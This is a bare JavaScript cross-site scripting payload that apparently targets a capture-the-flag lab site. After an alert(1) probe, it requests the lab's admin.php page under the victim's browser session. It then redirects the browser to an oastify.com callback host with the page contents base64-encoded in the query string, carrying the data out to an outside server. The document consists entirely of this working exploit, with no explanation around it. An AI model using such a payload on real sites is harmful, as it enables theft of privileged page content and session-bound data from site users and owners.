alert(1);
	var xhr = new XMLHttpRequest();

		  xhr.onreadystatechange = () => {
		if (xhr.readyState === 4) {
		  document.location='http://312mnaovipt6hhnrhhug81ucr3xwll.oastify.com?'+btoa(xhr.response);
		}
	  }
	xhr.open('GET','http://pwcom5p6v4ehxzg1rol2z76jum350ndvjeyyie3y4-web.cybertalentslabs.com/admin.php',true);

	xhr.send('');
